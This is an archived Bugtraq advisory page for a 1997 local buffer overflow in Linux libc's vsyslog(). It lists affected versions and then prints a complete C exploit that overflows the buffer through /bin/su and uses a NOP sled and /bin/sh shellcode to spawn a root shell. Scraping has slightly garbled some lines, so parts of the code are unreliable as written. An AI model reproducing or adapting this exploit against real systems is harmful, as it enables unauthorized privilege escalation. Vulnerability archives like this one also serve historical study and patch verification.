<p><b><span style="font-size: 18pt;">Linux vsyslog() Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/475/info">info</a><br><a href="http://www.securityfocus.com/bid/475/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/475/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/475/solution">solution</a><br><a href="http://www.securityfocus.com/bid/475/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				475
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Boundary Condition Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Dec 21 1997 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Dec 21 1997 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				First posted to BugTraq by Solar Designer &lt;solar@FALSE.COM&gt; on Dec 21, 1997.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Redhat Linux 4.0 <br/>
					
				
					Linux libc 5.4 <br/>
					
				
					Linux libc 5.3.12 <br/>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
				
					Redhat Linux 5.0 <br/>
					
				
					Linux libc 5.4.33 <br/>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	/*<br/> vsyslog()/openlog() exploit by BiT - 8/8 1997<br/> Greets to: doodle, skaut, melon, kweiheri etc.<br/> */<br/><br/>#include &lt;stdlib.h&gt;<br/>#include &lt;unistd.h&gt;<br/><br/>unsigned long get_esp(void)<br/>{<br/>  __asm__("movl %esp, %eax");<br/>}<br/><br/>void main(int argc, char **argv)<br/>{<br/>  unsigned char shell =<br/>  "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"<br/>  "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"<br/>  "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff_bin_sh";<br/>  char *buf,*p;<br/>  unsigned long *adr;<br/>  int i;<br/>  if((p=buf=malloc(2028+28)) == NULL)<br/>    exit(-1);<br/>  memset(p,0x90,2028);<br/>  p+=2028-strlen(shell);<br/>  for(i=0;i&lt;strlen(shell);i++)<br/>    *p++=shelli;<br/>  adr=(long *)p;<br/>  for(i=0;i&lt;7;i++)<br/>    *adr++=get_esp();<br/>  p=(char *)adr;<br/>  *p=0;<br/>  execl("/bin/su",buf,NULL);<br/>}
	
		<ul>
</ul>
</div>